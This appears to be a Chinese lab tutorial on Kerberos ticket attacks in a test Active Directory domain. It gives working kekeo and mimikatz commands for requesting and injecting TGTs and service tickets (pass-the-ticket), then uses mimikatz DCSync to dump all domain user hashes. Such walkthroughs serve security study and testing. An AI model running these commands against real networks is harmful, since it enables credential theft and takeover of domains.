# 申请TGT
## 1、kekeo自动导入票据
密码（明文/Hash）请求

默认情况下，域普通用户不可访问域控的cifs

![](../images/254cb5cf5c829ab5b3d3559993abae74.png)

使用命令导入tgt到内存（参数/ptt是自动导入，不加该参数就会生成一个kirbi文件）

```powershell
kekeo.exe "tgt::ask /user:administrator /domain:sec.com /password:Az123456@ /ptt" exit
```

可以看到成功访问到了C$

![](../images/f43a02a91061f09f38d4afd9bfa34237.png)

## 2、mimikatz手动导入凭证
先用kekeo生成一张凭证，并且使用mimikatz导入到内存

```powershell
kekeo.exe "tgt::ask /user:administrator /domain:sec.com /password:Az123456@" exit
mimikatz.exe "kerberos::ptt TGT_administrator.kirbi" exit
```

![](../images/5ca683e49b8bac67b6638d1af734591b.png)

命令行输入klist查询当前导入的凭证

![](../images/d38f474cad71012028af43653497abd6.png)

注1：如果导入凭证到内存后，即使使用kerberos::purge清除凭证，dir也还是可以正常使用，除非重启计算机

# 申请ST
## 1、先申请一张TGT到文件
上面实验已申请，故不在申请。

## 2、请求CIFS
先申请一张CIFS的TGS凭证

```powershell
.\kekeo.exe "tgs::ask /tgt:TGT_administrator@sec.com.kirbi /service:cifs/win2019-1.sec.com /ptt" exit
```

![](../images/4ece7cfc7beb97c08a3b267a4897e243.png)

klist查看确定已经导入TGS-CIFS凭证

![](../images/78921d92dbc95c86de2a261662db9e60.png)

dir也能正常访问

![](../images/546243fdf55e0d9c0c707ce2400fc87b.png)

## 3、请求LDAP
申请一张LDAP的ST凭证，并且/ptt导入到内存中

```powershell
.\kekeo.exe "tgs::ask /tgt:C:\Users\Administrator\Desktop\kekeo\x64\TGT_administrator@SEC.COM_krbtgt~sec.com@SEC.COM.kirbi /service:ldap/win2019-1.sec.com" exit
```

![](../images/0f1973eda659a3536117010c0c3f7b9d.png)

然后mimikatz通过DCSync导出域用户Hash

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:sec.com /all /csv"
```

![](../images/fb4e6335db46d9a32f1db7386ad26c15.png)

# DCSync导出分析
需要一台域机器，后文分析